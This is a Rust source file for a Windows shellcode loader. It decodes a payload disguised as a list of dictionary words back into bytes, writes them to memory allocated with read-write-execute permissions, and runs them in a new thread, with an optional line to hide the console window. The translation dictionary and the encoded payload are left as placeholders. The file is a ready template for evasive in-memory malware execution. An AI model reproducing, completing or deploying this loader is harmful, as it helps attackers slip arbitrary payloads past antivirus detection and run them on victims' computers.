//#![windows_subsystem = "windows"] // Hide console window

use std::ptr;
use std::collections::HashMap;
use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

// Decodes a slice of string words into a vector of bytes using a translation dictionary
fn decode_shellcode_words(translate_dict: &[&str; 256], dict_words: &[&str]) -> Vec<u8> {
    // Create a reverse map from the dictionary word to its index for fast lookups
    let dict_map: HashMap<&str, u8> = translate_dict
        .iter()
        .enumerate()
        .map(|(index, &word)| (word, index as u8)) // i.e. ("word", 6)
        .collect();

    // Look up each word and collect the corresponding bytes.
    dict_words
        .iter()
        .map(|&word| *dict_map.get(word).expect("Word not found in dictionary"))
        .collect() // Return u8 byte array
}

// Translate dictionary (256 words)
// --> SHELLCODE TRANSLATION DICTIONARY GOES HERE <--	
//Example:
const TRANSLATE_DICT: [&str; 256] = ["one", "two", "three"];

fn main() {
	// Shellcode encoded dictionary words
    // --> ENCODED SHELLCODE WORDS GOES HERE <--
	//Example:
    let dict_words = ["shellcode","words","here","one","two","three"];

    // Decode the string array back into bytes
    let shellcode = decode_shellcode_words(&TRANSLATE_DICT, &dict_words);
    let shellcode_len = shellcode.len();

    println!("Decoded dictionay words to shellcode bytes");

    // Need to call Windows APIs in 'unsafe' block
    unsafe {
		// Allocate memory for the shellcode
        let addr = VirtualAlloc(Some(ptr::null_mut()), shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if addr.is_null() {
            panic!("Failed to allocate memory");
        }

        // Copy the shellcode into the allocated memory
        ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode_len);

        println!("Launching shellcode!");

        // Create a new thread to execute the shellcode
        let thread_handle = CreateThread(ptr::null_mut(), 0, std::mem::transmute(addr), ptr::null_mut(), 0, ptr::null_mut(),);

        if thread_handle.is_null() {
            panic!("Failed to create thread");
        }

        // Wait for the thread to finish its execution
        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }
}